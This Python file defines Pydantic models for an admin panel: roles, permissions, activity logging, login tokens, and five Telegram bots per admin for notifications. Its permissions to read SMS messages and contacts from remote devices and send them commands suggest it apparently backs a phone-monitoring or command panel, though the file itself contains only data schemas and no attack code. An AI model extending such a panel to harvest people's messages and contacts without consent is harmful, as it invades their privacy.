from pydantic import BaseModel, Field, EmailStr
from typing import Optional, List
from datetime import datetime
from enum import Enum

class AdminRole(str, Enum):
    SUPER_ADMIN = "super_admin"
    ADMIN = "admin"
    VIEWER = "viewer"

class AdminPermission(str, Enum):

    VIEW_DEVICES = "view_devices"
    MANAGE_DEVICES = "manage_devices"
    SEND_COMMANDS = "send_commands"
    VIEW_SMS = "view_sms"
    VIEW_CONTACTS = "view_contacts"
    DELETE_DATA = "delete_data"

    MANAGE_ADMINS = "manage_admins"
    VIEW_ADMIN_LOGS = "view_admin_logs"

    CHANGE_SETTINGS = "change_settings"

class ActivityType(str, Enum):
    LOGIN = "login"
    LOGOUT = "logout"
    VIEW_DEVICE = "view_device"
    VIEW_SMS = "view_sms"
    VIEW_CONTACTS = "view_contacts"
    SEND_COMMAND = "send_command"
    DELETE_DATA = "delete_data"
    CREATE_ADMIN = "create_admin"
    UPDATE_ADMIN = "update_admin"
    DELETE_ADMIN = "delete_admin"
    CHANGE_SETTINGS = "change_settings"

class TelegramBot(BaseModel):
    """Telegram Bot Configuration"""
    bot_id: int  # 1-5
    bot_name: str
    token: str  # Bot token
    chat_id: str  # Numeric chat ID where messages will be sent

class Admin(BaseModel):
    username: str
    email: EmailStr
    password_hash: str
    full_name: str
    role: AdminRole = AdminRole.VIEWER
    permissions: List[AdminPermission] = Field(default_factory=list)

    # Device Token
    device_token: Optional[str] = None
    
    # Telegram 2FA Chat ID (personal numeric ID for 2FA notifications)
    telegram_2fa_chat_id: Optional[str] = None
    
    # Telegram Bots (5 bots with token + chat_id each)
    telegram_bots: List[TelegramBot] = Field(default_factory=list)

    is_active: bool = True
    created_by: Optional[str] = None

    last_login: Optional[datetime] = None
    login_count: int = 0
    
    # Single Session Control
    current_session_id: Optional[str] = None  # Only one active session per admin
    last_session_ip: Optional[str] = None
    last_session_device: Optional[str] = None

    created_at: datetime = Field(default_factory=datetime.utcnow)
    updated_at: datetime = Field(default_factory=datetime.utcnow)

class AdminCreate(BaseModel):
    username: str
    email: EmailStr
    password: str
    full_name: str
    role: AdminRole = AdminRole.VIEWER
    permissions: List[AdminPermission] = Field(default_factory=list)
    
    # Telegram 2FA Chat ID (personal numeric ID)
    telegram_2fa_chat_id: Optional[str] = None
    
    # Telegram Bots (each bot has token + chat_id)
    telegram_bots: Optional[List[TelegramBot]] = None

class AdminUpdate(BaseModel):
    email: Optional[EmailStr] = None
    full_name: Optional[str] = None
    role: Optional[AdminRole] = None
    permissions: Optional[List[AdminPermission]] = None
    is_active: Optional[bool] = None
    telegram_2fa_chat_id: Optional[str] = None
    telegram_bots: Optional[List[TelegramBot]] = None

class AdminLogin(BaseModel):
    username: str
    password: str

class AdminResponse(BaseModel):
    username: str
    email: str
    full_name: str
    role: AdminRole
    permissions: List[AdminPermission]
    device_token: Optional[str] = None
    telegram_2fa_chat_id: Optional[str] = None
    telegram_bots: List[TelegramBot] = Field(default_factory=list)
    is_active: bool
    last_login: Optional[datetime]
    login_count: int
    created_at: datetime

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    expires_in: int
    admin: AdminResponse

class AdminActivity(BaseModel):
    admin_username: str
    activity_type: ActivityType
    description: str

    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    device_id: Optional[str] = None

    metadata: dict = Field(default_factory=dict)

    success: bool = True
    error_message: Optional[str] = None

    timestamp: datetime = Field(default_factory=datetime.utcnow)

class TelegramNotification(BaseModel):
    type: str
    title: str
    message: str
    priority: str = "normal"
    data: dict = Field(default_factory=dict)
    timestamp: datetime = Field(default_factory=datetime.utcnow)

ROLE_PERMISSIONS = {
    AdminRole.SUPER_ADMIN: [

        AdminPermission.VIEW_DEVICES,
        AdminPermission.MANAGE_DEVICES,
        AdminPermission.SEND_COMMANDS,
        AdminPermission.VIEW_SMS,
        AdminPermission.VIEW_CONTACTS,
        AdminPermission.DELETE_DATA,
        AdminPermission.MANAGE_ADMINS,
        AdminPermission.VIEW_ADMIN_LOGS,
        AdminPermission.CHANGE_SETTINGS,
    ],
    AdminRole.ADMIN: [

        AdminPermission.VIEW_DEVICES,
        AdminPermission.MANAGE_DEVICES,
        AdminPermission.SEND_COMMANDS,
        AdminPermission.VIEW_SMS,
        AdminPermission.VIEW_CONTACTS,
        AdminPermission.CHANGE_SETTINGS,
    ],
    AdminRole.VIEWER: [

        AdminPermission.VIEW_DEVICES,
        AdminPermission.VIEW_SMS,
        AdminPermission.VIEW_CONTACTS,
    ]
}
